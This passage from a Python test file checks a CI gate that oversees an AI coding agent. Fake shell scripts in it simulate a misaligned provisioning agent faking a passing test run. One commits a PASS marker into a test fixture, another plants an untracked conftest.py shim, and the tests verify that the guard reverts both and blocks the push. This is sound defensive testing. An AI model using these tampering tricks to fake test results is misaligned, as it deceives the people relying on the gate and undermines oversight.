    _git(["remote", "add", "origin", str(remote)], cwd=seed)
    _git(["push", "origin", "main"], cwd=seed)

    repo_url = "file://%s" % remote
    bindir = tmp_path / "bin"
    bindir.mkdir(parents=True)

    # Real cargo: passes ONLY if the tracked gate_marker says PASS. The
    # legitimate seed says FAIL, so a true verdict is fail. If the agent's
    # edit survives, cargo would pass — which the guard must prevent.
    _write_exec(
        bindir / "cargo",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "test" ]; then\n'
        '  if grep -q PASS gate_marker 2>/dev/null; then echo "ok"; exit 0; fi\n'
        '  echo "test failed" >&2; exit 1\n'
        'fi\n'
        'exit 0\n',
    )
    # Malicious provisioning agent: edits the tracked gate_marker to PASS
    # (i.e. tampers with the test fixture) and commits it. The guard must
    # reset --hard this away before the gate's cargo re-run.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode test"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        '  case "$*" in\n'
        '    *PROVISION-ONLY*)\n'
        '      echo PASS > gate_marker\n'
        '      git add -A >/dev/null 2>&1\n'
        '      git -c user.name=a -c user.email=a@a commit -m tamper >/dev/null 2>&1\n'
        '      ;;\n'
        '    *)\n'
        '      # Build phase: make a benign tracked change so the script\n'
        '      # reaches the gate (WORK_REF exists). This change is part of\n'
        '      # the pre-provision HEAD snapshot, so the guard preserves it;\n'
        '      # only the later PROVISION-ONLY tamper is reverted.\n'
        '      printf "build phase edit\\n" >> README.md\n'
        '      ;;\n'
        '  esac\n'
        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
        '  exit 0\n'
        "fi\n"
        "exit 0\n",
    )
    task_json = json.dumps({
        "task": {
            "title": "x", "description": "x", "project": "demo",
            "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
        }
    })
    _write_exec(
        bindir / "curl",
        "#!/usr/bin/env bash\n"
        'url="${@: -1}"\n'
        'case "$url" in\n'
        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
        "  *) : ;;\n"
        "esac\nexit 0\n",
    )
    _write_exec(
        bindir / "mac",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "pull-request" ] && [ "$2" = "open" ]; then\n'
        '  echo \'{"url":"https://example.test/mr/1","number":1}\'\n  exit 0\nfi\nexit 0\n',
    )

    manifest_path = tmp_path / "mac-evidence.json"
    # NOTE: real git is used (not faked) so reset --hard actually runs. The
    # agent must produce a tracked change so the script reaches the gate; it
    # does (the tamper commit). Fallback is opt-in.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id="task_guard",
        extra_env={"MAC_GATE_AGENT_PROVISION_ENABLED": "1"},
    )

    # The guard reverted the tamper -> gate_marker is FAIL again -> cargo
    # test fails -> gate blocks. The agent could NOT fake a pass via edits.
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "fail", (
        "source-edit guard failed: agent tampered a tracked test fixture and "
        "the gate accepted it; stdout=%s" % result.stdout
    )
    assert result.returncode != 0
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False


def test_gate_blocks_when_provision_agent_revert_fails(tmp_path: Path) -> None:
    """Fail-closed on revert failure: the PROVISION-ONLY agent successfully
    provisions (so the real `cargo test` WOULD pass), but the post-run
    `git reset --hard` revert FAILS. The gate must NOT judge the possibly-
    tampered tree — it blocks (verdict fail), because a surviving agent edit
    could otherwise manufacture a pass."""
    bindir = tmp_path / "bin"
    _make_fake_bin(
        bindir,
        opencode_stdout=json.dumps({"type": "step_finish", "reason": "stop"}) + "\n",
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command=None,
        seed_unknown_test_cmd="cargo test",
    )
    # Override opencode: build-phase run seeds the README (so the gate detects
    # the unknown `cargo test` stack); the PROVISION-ONLY run creates the
    # marker so the fake cargo WOULD pass (rc=0). Despite that, a failed revert
    # must still block.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        '  printf "Run tests with: cargo test\\n" > README.md\n'
        '  case "$*" in\n'
        '    *PROVISION-ONLY*) touch .mac-provisioned ;;\n'
        '  esac\n'
        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )
    # Override git: rev-parse succeeds (so pre_sha is non-empty and the agent
    # runs), but `reset` FAILS — simulating an unrevertable tree. All other
    # subcommands behave like the default fake git.
    _write_exec(
        bindir / "git",
        "#!/usr/bin/env bash\n"
        'cmd="$1"; shift\n'
        'case "$cmd" in\n'
        "  clone)\n"
        '    dest="${@: -1}"\n'
        '    mkdir -p "$dest/.git"\n'
        "    ;;\n"
        "  config|checkout|add|commit) : ;;\n"
        '  status) echo " M a.txt" ;;\n'
        '  diff) printf "a.txt\\nb.txt\\n" ;;\n'
        '  rev-parse) echo "deadbeefcafef00d" ;;\n'
        "  push) exit 0 ;;\n"
        '  reset) echo "fatal: could not reset" >&2; exit 1 ;;\n'
        "  *) : ;;\n"
        "esac\n"
        "exit 0\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        extra_env={"MAC_GATE_AGENT_PROVISION_ENABLED": "1"},
    )

    # Revert failed -> tree untrusted -> gate fails closed (does not run/judge).
    assert result.returncode != 0
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "fail", (
        "fail-closed-on-revert-failure broken: gate judged a tree it could not "
        "revert; stdout=%s" % result.stdout
    )
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False


@pytest.mark.skipif(
    shutil.which("git") is None, reason="git required for untracked-scrub guard test"
)
def test_gate_agent_cannot_fake_pass_with_untracked_shim(tmp_path: Path) -> None:
    """gate-provision-untracked-poison-01: a misaligned PROVISION-ONLY agent
    drops an UNTRACKED shim (a root conftest.py) that flips the real command
    to pass. `git reset --hard` does NOT remove untracked files, so without the
    scrub the poison survives into the verdict run and manufactures a green.

    The untracked-file scrub must remove the agent-introduced shim (it is NOT
    inside the dependency allowlist), so the gate's own re-run of the REAL
    command still fails and the push is blocked. Proves the agent cannot fake a
    pass via an untracked side effect."""
    remote = tmp_path / "remote.git"
    _git(["init", "--bare", "-b", "main", str(remote)], cwd=tmp_path)
    seed = tmp_path / "seed"
    seed.mkdir()
    _git(["init", "-b", "main", str(seed)], cwd=tmp_path)
    (seed / "README.md").write_text("Run tests with: cargo test\n")
    _git(["add", "-A"], cwd=seed)
    _git(["commit", "-m", "seed"], cwd=seed)
    _git(["remote", "add", "origin", str(remote)], cwd=seed)
    _git(["push", "origin", "main"], cwd=seed)

    repo_url = "file://%s" % remote
    bindir = tmp_path / "bin"
    bindir.mkdir(parents=True)

    # Real cargo: passes ONLY if the untracked poison shim exists. The honest
    # tree has no shim, so a true verdict is fail. If the agent's untracked
    # conftest.py survives the scrub, cargo would pass — which the guard must
    # prevent.
    _write_exec(
        bindir / "cargo",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "test" ]; then\n'
        '  if [ -f conftest.py ]; then echo "ok"; exit 0; fi\n'
        '  echo "test failed" >&2; exit 1\n'
        'fi\n'
        'exit 0\n',
    )
    # Misaligned provisioning agent: drops an UNTRACKED root conftest.py shim
    # (never `git add`ed) so `git reset --hard` cannot remove it. The scrub
    # must delete it because conftest.py is not inside a dependency dir.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode test"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        '  case "$*" in\n'
        '    *PROVISION-ONLY*)\n'
        '      printf "# poison\\n" > conftest.py\n'
        '      # Also drop an untracked file INSIDE a dep dir to prove the\n'
        '      # allowlist preserves legitimate provisioned artifacts.\n'
        '      mkdir -p .venv && printf "dep\\n" > .venv/installed\n'
        '      ;;\n'
        '    *)\n'
        '      printf "build phase edit\\n" >> README.md\n'
        '      ;;\n'
        '  esac\n'
        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
        '  exit 0\n'
        "fi\n"
        "exit 0\n",
    )
    task_json = json.dumps({
        "task": {
            "title": "x", "description": "x", "project": "demo",
            "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
        }
    })
    _write_exec(
        bindir / "curl",
        "#!/usr/bin/env bash\n"
        'url="${@: -1}"\n'
        'case "$url" in\n'
        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
        "  *) : ;;\n"
        "esac\nexit 0\n",
    )
    _write_exec(
        bindir / "mac",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "pull-request" ] && [ "$2" = "open" ]; then\n'
        '  echo \'{"url":"https://example.test/mr/1","number":1}\'\n  exit 0\nfi\nexit 0\n',
    )

    manifest_path = tmp_path / "mac-evidence.json"
    # Real git is used (not faked) so reset --hard + the untracked scrub run
    # for real. Fallback is opt-in.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id="task_untracked_poison",
        extra_env={"MAC_GATE_AGENT_PROVISION_ENABLED": "1"},
    )

    # The scrub removed the untracked conftest.py -> cargo test fails -> gate
    # blocks. The agent could NOT fake a pass via an untracked shim.
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "fail", (
        "untracked-scrub guard failed: agent planted an untracked conftest.py "
        "shim and the gate accepted a manufactured pass; stdout=%s" % result.stdout
    )
    assert result.returncode != 0
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False


